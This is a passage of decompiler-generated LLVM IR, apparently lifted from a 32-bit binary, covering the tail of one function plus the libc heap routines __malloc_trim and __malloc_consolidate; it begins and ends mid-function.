  store i32 %v2_804aa01, i32* @ebx, align 4
  store i32 %v0_804a294, i32* @esi, align 4
  store i32 %v0_804a293, i32* @edi, align 4
  store i32 %v0_804a292, i32* @ebp, align 4
  ret i32 %v0_804a9ff

; uselistorder directives
  uselistorder i32 %v0_804a9c2, { 1, 0 }
  uselistorder i32 %v0_804a9a2, { 1, 0, 2 }
  uselistorder i32 %v2_804a93f, { 1, 0, 2 }
  uselistorder i32 %v0_804a92d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a8c4, { 1, 0 }
  uselistorder i32 %v2_804a8b2, { 1, 0 }
  uselistorder i32 %v1_804a869, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804a853, { 1, 0, 2 }
  uselistorder i32 %v2_804a847, { 1, 2, 0 }
  uselistorder i32 %v2_804a842, { 1, 0, 2 }
  uselistorder i32 %v1_804a832, { 2, 1, 0 }
  uselistorder i8 %v0_804a800, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804a7e3, { 1, 0, 2 }
  uselistorder i32 %v0_804a89791, { 2, 0, 1 }
  uselistorder i32 %v0_804a8a592, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804a7dd, { 2, 1, 0 }
  uselistorder i32 %v8_804a7b3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804a7b0, { 1, 0 }
  uselistorder i32 %v0_804a78f, { 1, 0 }
  uselistorder i32 %v2_804a760, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804a758, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804a745, { 1, 0 }
  uselistorder i32 %v1_804a73c, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_804a729, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804a70d, { 1, 0, 2 }
  uselistorder i32 %v2_804a6f9, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804a6c2, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a6b6, { 2, 1, 0 }
  uselistorder i32 %v8_804a6a5, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804a68c, { 1, 0, 2 }
  uselistorder i32 %v0_804a628, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804a5fb, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a5f1, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804a5e3, { 1, 0 }
  uselistorder i32 %v1_804a57a, { 1, 0 }
  uselistorder i32 %v3_804a56e, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804a57e, { 1, 0 }
  uselistorder i32 %v2_804a568, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804a56512, { 1, 0 }
  uselistorder i32 %v2_804a55a, { 1, 0 }
  uselistorder i32 %v1_804a53e, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a53a, { 2, 1, 0 }
  uselistorder i32 %v1_804a536, { 1, 0 }
  uselistorder i32 %v1_804a52a, { 2, 1, 0 }
  uselistorder i32 %v2_804a520, { 1, 0 }
  uselistorder i32 %v1_804a51d, { 1, 2, 0 }
  uselistorder i32 %v4_804a4bb, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804a506, { 1, 0 }
  uselistorder i32 %v0_804a4d4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804a4a7, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a474, { 1, 2, 0 }
  uselistorder i32 %v2_804a458, { 1, 0 }
  uselistorder i32 %v1_804a44e, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804a449.lcssa, { 1, 0 }
  uselistorder i32 %v3_804a439, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804a430, { 1, 0, 2 }
  uselistorder i32 %v2_804a40c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804a3f4, { 2, 1, 0 }
  uselistorder i32 %v0_804a3e0, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804a3a6, { 1, 0, 2 }
  uselistorder i32 %v0_804a474111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804a353, { 1, 0, 2 }
  uselistorder i32 %v2_804a345, { 2, 1, 0 }
  uselistorder i32 %v2_804a320, { 2, 1, 0 }
  uselistorder i8 %v0_804a2ee, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804a686, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804a2d7, { 0, 2, 1 }
  uselistorder i32 %v0_804a2c0, { 1, 0 }
  uselistorder i32 %v2_804a2a7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 17, 0, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8054960.53, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134563380, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8054640.41, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805462c.38 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804a9fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a9eb, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804a9de, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804a9da, { 1, 0 }
  uselistorder label %dec_label_pc_804a9d0, { 1, 0 }
  uselistorder label %dec_label_pc_804a97b, { 1, 0 }
  uselistorder label %dec_label_pc_804a952, { 1, 0 }
  uselistorder label %dec_label_pc_804a93f, { 1, 0 }
  uselistorder label %dec_label_pc_804a92d, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a8bf, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a8ba, { 1, 0 }
  uselistorder label %dec_label_pc_804a89e, { 1, 0 }
  uselistorder label %dec_label_pc_804a847, { 1, 0 }
  uselistorder label %dec_label_pc_804a830, { 1, 0 }
  uselistorder label %dec_label_pc_804a819, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a79c, { 1, 0 }
  uselistorder label %dec_label_pc_804a78f, { 1, 0 }
  uselistorder label %dec_label_pc_804a750, { 1, 0 }
  uselistorder label %dec_label_pc_804a729, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804a70d, { 1, 0 }
  uselistorder label %dec_label_pc_804a6f4, { 1, 0 }
  uselistorder label %dec_label_pc_804a6d6, { 1, 0 }
  uselistorder label %dec_label_pc_804a5f1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a5e9, { 1, 0 }
  uselistorder label %dec_label_pc_804a5d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a565, { 1, 0 }
  uselistorder label %dec_label_pc_804a56a.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a53e, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a4c5, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804a44c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a435, { 1, 0 }
  uselistorder label %dec_label_pc_804a3a3, { 1, 0 }
  uselistorder label %dec_label_pc_804a474.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a370, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804a2ee, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804aa0f = load i32, i32* @edx, align 4
  store i32 %v0_804aa0f, i32* %ebp.global-to-local, align 4
  %v1_804aa11 = add i32 %v0_804aa0f, 860
  %v2_804aa11 = inttoptr i32 %v1_804aa11 to i32*
  %v3_804aa11 = load i32, i32* %v2_804aa11, align 4
  store i32 %v3_804aa11, i32* @ecx, align 4
  %v1_804aa17 = add i32 %v0_804aa0f, 44
  %v2_804aa17 = inttoptr i32 %v1_804aa17 to i32*
  %v3_804aa17 = load i32, i32* %v2_804aa17, align 4
  %v1_804aa1a = add i32 %v3_804aa17, 4
  %v2_804aa1a = inttoptr i32 %v1_804aa1a to i32*
  %v3_804aa1a = load i32, i32* %v2_804aa1a, align 4
  %v1_804aa1d = and i32 %v3_804aa1a, -4
  store i32 %v1_804aa1d, i32* @esi, align 4
  %v1_804aa22 = load i32, i32* @eax, align 4
  %v2_804aa22 = add i32 %v3_804aa11, -17
  %v2_804aa24 = add i32 %v2_804aa22, %v1_804aa1d
  %v3_804aa24 = sub i32 %v2_804aa24, %v1_804aa22
  %div = udiv i32 %v3_804aa24, %v3_804aa11
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804aa24, %v3_804aa11
  store i32 %tmp10, i32* @edx, align 4
  %v1_804aa2c = add i32 %div, -1
  %v4_804aa2f = mul i32 %v1_804aa2c, %v3_804aa11
  store i32 %v4_804aa2f, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804aa2f, 1
  br i1 %tmp11, label %dec_label_pc_804aa8b, label %dec_label_pc_804aa36

dec_label_pc_804aa36:                             ; preds = %entry
  %v1_804aa3b = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa3b, i32* %edi.global-to-local, align 4
  %v0_804aa42 = load i32, i32* @esi, align 4
  store i32 %v0_804aa42, i32* %eax.global-to-local, align 4
  %v1_804aa44 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804aa44 = add i32 %v1_804aa44, 44
  %v3_804aa44 = inttoptr i32 %v2_804aa44 to i32*
  %v4_804aa44 = load i32, i32* %v3_804aa44, align 4
  %v5_804aa44 = add i32 %v4_804aa44, %v0_804aa42
  store i32 %v5_804aa44, i32* %eax.global-to-local, align 4
  %v12_804aa4a = icmp eq i32 %v1_804aa3b, %v5_804aa44
  %v1_804aa4c = icmp eq i1 %v12_804aa4a, false
  br i1 %v1_804aa4c, label %dec_label_pc_804aa8b, label %dec_label_pc_804aa4e

dec_label_pc_804aa4e:                             ; preds = %dec_label_pc_804aa36
  %v1_804aa51 = sub i32 0, %v4_804aa2f
  store i32 %v1_804aa51, i32* @ebx, align 4
  %v1_804aa54 = call i32 @__GI_sbrk(i32 %v1_804aa51)
  store i32 %v1_804aa54, i32* %eax.global-to-local, align 4
  %v1_804aa60 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa60, i32* %eax.global-to-local, align 4
  %v10_804aa68 = icmp eq i32 %v1_804aa60, -1
  br i1 %v10_804aa68, label %dec_label_pc_804aa8b, label %dec_label_pc_804aa6d

dec_label_pc_804aa6d:                             ; preds = %dec_label_pc_804aa4e
  %v0_804aa6d = load i32, i32* %edi.global-to-local, align 4
  %v2_804aa6f = sub i32 %v0_804aa6d, %v1_804aa60
  %v12_804aa6f = icmp eq i32 %v2_804aa6f, 0
  store i32 %v2_804aa6f, i32* @ecx, align 4
  br i1 %v12_804aa6f, label %dec_label_pc_804aa8b, label %dec_label_pc_804aa73

dec_label_pc_804aa73:                             ; preds = %dec_label_pc_804aa6d
  %v0_804aa73 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804aa73 = add i32 %v0_804aa73, 44
  %v2_804aa73 = inttoptr i32 %v1_804aa73 to i32*
  %v3_804aa73 = load i32, i32* %v2_804aa73, align 4
  store i32 %v3_804aa73, i32* %eax.global-to-local, align 4
  %v1_804aa76 = add i32 %v0_804aa73, 872
  %v2_804aa76 = inttoptr i32 %v1_804aa76 to i32*
  %v3_804aa76 = load i32, i32* %v2_804aa76, align 4
  %v5_804aa76 = sub i32 %v3_804aa76, %v2_804aa6f
  store i32 %v5_804aa76, i32* %v2_804aa76, align 4
  %v0_804aa7c = load i32, i32* @esi, align 4
  %v1_804aa7c = load i32, i32* @ecx, align 4
  %v2_804aa7c = sub i32 %v0_804aa7c, %v1_804aa7c
  %v1_804aa7e = or i32 %v2_804aa7c, 1
  %v1_804aa81 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa81 = add i32 %v1_804aa81, 4
  %v3_804aa81 = inttoptr i32 %v2_804aa81 to i32*
  store i32 %v1_804aa7e, i32* %v3_804aa81, align 4
  br label %dec_label_pc_804aa8d

dec_label_pc_804aa8b:                             ; preds = %dec_label_pc_804aa6d, %dec_label_pc_804aa4e, %dec_label_pc_804aa36, %entry
  br label %dec_label_pc_804aa8d

dec_label_pc_804aa8d:                             ; preds = %dec_label_pc_804aa73, %dec_label_pc_804aa8b
  %storemerge = phi i32 [ 1, %dec_label_pc_804aa73 ], [ 0, %dec_label_pc_804aa8b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804aa60, { 1, 0, 2 }
  uselistorder i32 %v4_804aa2f, { 1, 2, 0 }
  uselistorder i32 %v3_804aa11, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804aa8d, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804aa96 = load i32, i32* @edi, align 4
  %v0_804aa97 = load i32, i32* @esi, align 4
  %v0_804aa98 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804aaa0 = load i32, i32* %arg1, align 4
  store i32 %v2_804aaa0, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804aaa7 = icmp eq i32 %v2_804aaa0, 0
  br i1 %v1_804aaa7, label %dec_label_pc_804abd0.preheader, label %dec_label_pc_804aaaf

dec_label_pc_804abd0.preheader:                   ; preds = %entry
  %v3_804abc5 = add i32 %tmp11, 44
  br label %dec_label_pc_804abc1

dec_label_pc_804aaaf:                             ; preds = %entry
  %v1_804aab3 = and i32 %v2_804aaa0, -3
  store i32 %v1_804aab3, i32* %arg1, align 4
  %v1_804aab8 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804aac3 = add i32 %tmp11, 4
  store i32 %v1_804aac3, i32* %eax.global-to-local, align 4
  %v2_804aace = load i32, i32* %arg1, align 4
  %v2_804aad4 = udiv i32 %v2_804aace, 8
  %v2_804aad7 = mul nuw i32 %v2_804aad4, 4
  %v3_804aad7 = add i32 %tmp11, -4
  %v4_804aad7 = add i32 %v3_804aad7, %v2_804aad7
  store i32 %v4_804aad7, i32* %eax.global-to-local, align 4
  %v2_804ab9e = add i32 %tmp11, 44
  %v3_804ab9e = inttoptr i32 %v2_804ab9e to i32*
  %v1_804ab71 = add i32 %tmp11, 60
  %v2_804ab71 = inttoptr i32 %v1_804ab71 to i32*
  br label %dec_label_pc_804aadf

dec_label_pc_804aadf:                             ; preds = %dec_label_pc_804abb7, %dec_label_pc_804aaaf
  %v0_804aaed = phi i32 [ %v1_804aac3, %dec_label_pc_804aaaf ], [ %v4_804abb7, %dec_label_pc_804abb7 ]
  store i32 %v0_804aaed, i32* %eax.global-to-local, align 4
  %v1_804aae3 = inttoptr i32 %v0_804aaed to i32*
  %v2_804aae3 = load i32, i32* %v1_804aae3, align 4
  store i32 %v2_804aae3, i32* @ecx, align 4
  %v1_804aae5 = icmp eq i32 %v2_804aae3, 0
  br i1 %v1_804aae5, label %dec_label_pc_804abad, label %dec_label_pc_804aaed

dec_label_pc_804aaed:                             ; preds = %dec_label_pc_804aadf
  store i32 0, i32* %v1_804aae3, align 4
  %v0_804aaf3.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804aaf3

dec_label_pc_804aaf3:                             ; preds = %dec_label_pc_804aba1, %dec_label_pc_804aaed
  %v0_804ab10 = phi i32 [ %v3_804aaf3, %dec_label_pc_804aba1 ], [ %v0_804aaf3.pre, %dec_label_pc_804aaed ]
  %v1_804aaf3 = add i32 %v0_804ab10, 8
  %v2_804aaf3 = inttoptr i32 %v1_804aaf3 to i32*
  %v3_804aaf3 = load i32, i32* %v2_804aaf3, align 4
  store i32 %v3_804aaf3, i32* %edx.global-to-local, align 4
  %v1_804aafa = add i32 %v0_804ab10, 4
  %v2_804aafa = inttoptr i32 %v1_804aafa to i32*
  %v3_804aafa = load i32, i32* %v2_804aafa, align 4
  store i32 %v3_804aafa, i32* %eax.global-to-local, align 4
  %v1_804aaff = and i32 %v3_804aafa, -2
  store i32 %v1_804aaff, i32* @edi, align 4
  %v2_804ab02 = urem i32 %v3_804aafa, 2
  %v3_804ab02 = icmp eq i32 %v2_804ab02, 0
  %v2_804ab04 = add i32 %v1_804aaff, %v0_804ab10
  store i32 %v2_804ab04, i32* @ebx, align 4
  %v1_804ab07 = add i32 %v2_804ab04, 4
  %v2_804ab07 = inttoptr i32 %v1_804ab07 to i32*
  %v3_804ab07 = load i32, i32* %v2_804ab07, align 4
  store i32 %v3_804ab07, i32* %edx.global-to-local, align 4
  %v1_804ab0e = icmp eq i1 %v3_804ab02, false
  br i1 %v1_804ab0e, label %dec_label_pc_804ab30, label %dec_label_pc_804ab10

dec_label_pc_804ab10:                             ; preds = %dec_label_pc_804aaf3
  %v1_804ab10 = inttoptr i32 %v0_804ab10 to i32*
  %v2_804ab10 = load i32, i32* %v1_804ab10, align 4
  store i32 %v2_804ab10, i32* %ebp.global-to-local, align 4
  %v2_804ab14 = sub i32 %v0_804ab10, %v2_804ab10
  store i32 %v2_804ab14, i32* %eax.global-to-local, align 4
  %v1_804ab16 = add i32 %v2_804ab14, 8
  %v2_804ab16 = inttoptr i32 %v1_804ab16 to i32*
  %v3_804ab16 = load i32, i32* %v2_804ab16, align 4
  store i32 %v3_804ab16, i32* @esi, align 4
  %v1_804ab19 = add i32 %v2_804ab14, 12
  %v2_804ab19 = inttoptr i32 %v1_804ab19 to i32*
  %v3_804ab19 = load i32, i32* %v2_804ab19, align 4
  store i32 %v3_804ab19, i32* %edx.global-to-local, align 4
  %v1_804ab1c = add i32 %v3_804ab16, 12
  %v2_804ab1c = inttoptr i32 %v1_804ab1c to i32*
  %v3_804ab1c = load i32, i32* %v2_804ab1c, align 4
  store i32 %v3_804ab1c, i32* @ecx, align 4
  %v12_804ab1f = icmp eq i32 %v3_804ab1c, %v2_804ab14
  %v1_804ab21 = icmp eq i1 %v12_804ab1f, false
  br i1 %v1_804ab21, label %dec_label_pc_804ab60, label %dec_label_pc_804ab23

dec_label_pc_804ab23:                             ; preds = %dec_label_pc_804ab10
  %v1_804ab23 = add i32 %v3_804ab19, 8
  %v2_804ab23 = inttoptr i32 %v1_804ab23 to i32*
  %v3_804ab23 = load i32, i32* %v2_804ab23, align 4
  %v15_804ab23 = icmp eq i32 %v3_804ab23, %v3_804ab1c
  %v1_804ab26 = icmp eq i1 %v15_804ab23, false
  br i1 %v1_804ab26, label %dec_label_pc_804ab60, label %dec_label_pc_804ab28

dec_label_pc_804ab28:                             ; preds = %dec_label_pc_804ab23
  %v2_804ab28 = add i32 %v2_804ab10, %v1_804aaff
  store i32 %v2_804ab28, i32* @edi, align 4
  store i32 %v3_804ab19, i32* %v2_804ab1c, align 4
  %v0_804ab2d = load i32, i32* @esi, align 4
  %v1_804ab2d = load i32, i32* %edx.global-to-local, align 4
  %v2_804ab2d = add i32 %v1_804ab2d, 8
  %v3_804ab2d = inttoptr i32 %v2_804ab2d to i32*
  store i32 %v0_804ab2d, i32* %v3_804ab2d, align 4
  %v0_804ab3b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ab30

dec_label_pc_804ab30:                             ; preds = %dec_label_pc_804aaf3, %dec_label_pc_804ab28
  %v1_804ab44 = phi i32 [ %v2_804ab04, %dec_label_pc_804aaf3 ], [ %v0_804ab3b.pre, %dec_label_pc_804ab28 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ab38 = and i32 %v3_804ab07, -4
  store i32 %v1_804ab38, i32* %ebp.global-to-local, align 4
  %v4_804ab3b = load i32, i32* %v3_804ab9e, align 4
  %v15_804ab3b = icmp eq i32 %v1_804ab44, %v4_804ab3b
  br i1 %v15_804ab3b, label %dec_label_pc_804ab91, label %dec_label_pc_804ab40

dec_label_pc_804ab40:                             ; preds = %dec_label_pc_804ab30
  %v2_804ab40 = add i32 %v1_804ab44, 4
  %v3_804ab40 = add i32 %v2_804ab40, %v1_804ab38
  %v4_804ab40 = inttoptr i32 %v3_804ab40 to i32*
  %v5_804ab40 = load i32, i32* %v4_804ab40, align 4
  store i32 %v5_804ab40, i32* %eax.global-to-local, align 4
  %v3_804ab44 = inttoptr i32 %v2_804ab40 to i32*
  store i32 %v1_804ab38, i32* %v3_804ab44, align 4
  %v0_804ab47 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab47 = urem i32 %v0_804ab47, 2
  %v2_804ab47 = icmp eq i32 %v1_804ab47, 0
  store i32 %v1_804ab47, i32* %eax.global-to-local, align 4
  %v1_804ab4c = icmp eq i1 %v2_804ab47, false
  br i1 %v1_804ab4c, label %dec_label_pc_804ab6d, label %dec_label_pc_804ab4e

dec_label_pc_804ab4e:                             ; preds = %dec_label_pc_804ab40
  %v0_804ab4e = load i32, i32* @ebx, align 4
  %v1_804ab4e = add i32 %v0_804ab4e, 8
  %v2_804ab4e = inttoptr i32 %v1_804ab4e to i32*
  %v3_804ab4e = load i32, i32* %v2_804ab4e, align 4
  store i32 %v3_804ab4e, i32* @edx, align 4
  %v1_804ab51 = add i32 %v0_804ab4e, 12
  %v2_804ab51 = inttoptr i32 %v1_804ab51 to i32*
  %v3_804ab51 = load i32, i32* %v2_804ab51, align 4
  store i32 %v3_804ab51, i32* %eax.global-to-local, align 4
  %v1_804ab54 = add i32 %v3_804ab4e, 12
  %v2_804ab54 = inttoptr i32 %v1_804ab54 to i32*
  %v3_804ab54 = load i32, i32* %v2_804ab54, align 4
  store i32 %v3_804ab54, i32* @esi, align 4
  %v12_804ab57 = icmp eq i32 %v3_804ab54, %v0_804ab4e
  %v1_804ab59 = icmp eq i1 %v12_804ab57, false
  br i1 %v1_804ab59, label %dec_label_pc_804ab60, label %dec_label_pc_804ab5b

dec_label_pc_804ab5b:                             ; preds = %dec_label_pc_804ab4e
  %v1_804ab5b = add i32 %v3_804ab51, 8
  %v2_804ab5b = inttoptr i32 %v1_804ab5b to i32*
  %v3_804ab5b = load i32, i32* %v2_804ab5b, align 4
  %v15_804ab5b = icmp eq i32 %v3_804ab5b, %v3_804ab54
  br i1 %v15_804ab5b, label %dec_label_pc_804ab65, label %dec_label_pc_804ab60

dec_label_pc_804ab60:                             ; preds = %dec_label_pc_804ab5b, %dec_label_pc_804ab4e, %dec_label_pc_804ab23, %dec_label_pc_804ab10
  %v0_804ab60 = call i32 @abort()
  store i32 %v0_804ab60, i32* %eax.global-to-local, align 4
  %v1_804ab67.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ab65

dec_label_pc_804ab65:                             ; preds = %dec_label_pc_804ab5b, %dec_label_pc_804ab60
  %v1_804ab67 = phi i32 [ %v3_804ab4e, %dec_label_pc_804ab5b ], [ %v1_804ab67.pre, %dec_label_pc_804ab60 ]
  %v0_804ab67 = phi i32 [ %v3_804ab51, %dec_label_pc_804ab5b ], [ %v0_804ab60, %dec_label_pc_804ab60 ]
  %v0_804ab65 = load i32, i32* @edi, align 4
  %v1_804ab65 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ab65 = add i32 %v1_804ab65, %v0_804ab65
  store i32 %v2_804ab65, i32* @edi, align 4
  %v2_804ab67 = add i32 %v1_804ab67, 12
  %v3_804ab67 = inttoptr i32 %v2_804ab67 to i32*
  store i32 %v0_804ab67, i32* %v3_804ab67, align 4
  %v0_804ab6a = load i32, i32* @edx, align 4
  %v1_804ab6a = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab6a = add i32 %v1_804ab6a, 8
  %v3_804ab6a = inttoptr i32 %v2_804ab6a to i32*
  store i32 %v0_804ab6a, i32* %v3_804ab6a, align 4
  br label %dec_label_pc_804ab6d

dec_label_pc_804ab6d:                             ; preds = %dec_label_pc_804ab40, %dec_label_pc_804ab65
  store i32 %v1_804aab8, i32* %eax.global-to-local, align 4
  %v3_804ab71 = load i32, i32* %v2_804ab71, align 4
  store i32 %v3_804ab71, i32* @edx, align 4
  %v0_804ab74 = load i32, i32* @ecx, align 4
  store i32 %v0_804ab74, i32* %v2_804ab71, align 4
  %v0_804ab77 = load i32, i32* @edi, align 4
  %v1_804ab79 = or i32 %v0_804ab77, 1
  store i32 %v1_804ab79, i32* %eax.global-to-local, align 4
  %v0_804ab7c = load i32, i32* @ecx, align 4
  %v1_804ab7c = load i32, i32* @edx, align 4
  %v2_804ab7c = add i32 %v1_804ab7c, 12
  %v3_804ab7c = inttoptr i32 %v2_804ab7c to i32*
  store i32 %v0_804ab7c, i32* %v3_804ab7c, align 4
  %v0_804ab7f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab7f = load i32, i32* @ecx, align 4
  %v2_804ab7f = add i32 %v1_804ab7f, 4
  %v3_804ab7f = inttoptr i32 %v2_804ab7f to i32*
  store i32 %v0_804ab7f, i32* %v3_804ab7f, align 4
  store i32 %v1_804aab8, i32* %eax.global-to-local, align 4
  %v0_804ab86 = load i32, i32* @edx, align 4
  %v1_804ab86 = load i32, i32* @ecx, align 4
  %v2_804ab86 = add i32 %v1_804ab86, 8
  %v3_804ab86 = inttoptr i32 %v2_804ab86 to i32*
  store i32 %v0_804ab86, i32* %v3_804ab86, align 4
  %v0_804ab89 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab89 = load i32, i32* @ecx, align 4
  %v2_804ab89 = add i32 %v1_804ab89, 12
  %v3_804ab89 = inttoptr i32 %v2_804ab89 to i32*
  store i32 %v0_804ab89, i32* %v3_804ab89, align 4
  %v0_804ab8c = load i32, i32* @edi, align 4
  %v1_804ab8c = load i32, i32* @ecx, align 4
  %v3_804ab8c = add i32 %v1_804ab8c, %v0_804ab8c
  %v4_804ab8c = inttoptr i32 %v3_804ab8c to i32*
  store i32 %v0_804ab8c, i32* %v4_804ab8c, align 4
  br label %dec_label_pc_804aba1

dec_label_pc_804ab91:                             ; preds = %dec_label_pc_804ab30
  %v0_804ab91 = load i32, i32* @edi, align 4
  %v2_804ab91 = add i32 %v0_804ab91, %v1_804ab38
  %v1_804ab94 = or i32 %v2_804ab91, 1
  store i32 %v1_804ab94, i32* %eax.global-to-local, align 4
  %v1_804ab97 = load i32, i32* @ecx, align 4
  %v2_804ab97 = add i32 %v1_804ab97, 4
  %v3_804ab97 = inttoptr i32 %v2_804ab97 to i32*
  store i32 %v1_804ab94, i32* %v3_804ab97, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804ab9e = load i32, i32* @ecx, align 4
  store i32 %v0_804ab9e, i32* %v3_804ab9e, align 4
  br label %dec_label_pc_804aba1

dec_label_pc_804aba1:                             ; preds = %dec_label_pc_804ab6d, %dec_label_pc_804ab91
  store i32 %v3_804aaf3, i32* @ecx, align 4
  %v1_804aba5 = icmp eq i32 %v3_804aaf3, 0
  %v1_804aba7 = icmp eq i1 %v1_804aba5, false
  br i1 %v1_804aba7, label %dec_label_pc_804aaf3, label %dec_label_pc_804abad

dec_label_pc_804abad:                             ; preds = %dec_label_pc_804aba1, %dec_label_pc_804aadf
  store i32 %v4_804aad7, i32* @ecx, align 4
  %v15_804abb1 = icmp eq i32 %v0_804aaed, %v4_804aad7
  br i1 %v15_804abb1, label %dec_label_pc_804ac35, label %dec_label_pc_804abb7

dec_label_pc_804abb7:                             ; preds = %dec_label_pc_804abad
  %v4_804abb7 = add i32 %v0_804aaed, 4
  br label %dec_label_pc_804aadf

dec_label_pc_804abc1:                             ; preds = %dec_label_pc_804abd0.preheader, %dec_label_pc_804abc1
  %v1_804abc520 = phi i32 [ 1, %dec_label_pc_804abd0.preheader ], [ %v0_804abd0.pre, %dec_label_pc_804abc1 ]
  %v2_804abc5 = mul i32 %v1_804abc520, 8
  %v4_804abc5 = add i32 %v3_804abc5, %v2_804abc5
  store i32 %v4_804abc5, i32* %eax.global-to-local, align 4
  %v1_804abc9 = add i32 %v1_804abc520, 1
  store i32 %v1_804abc9, i32* %edx.global-to-local, align 4
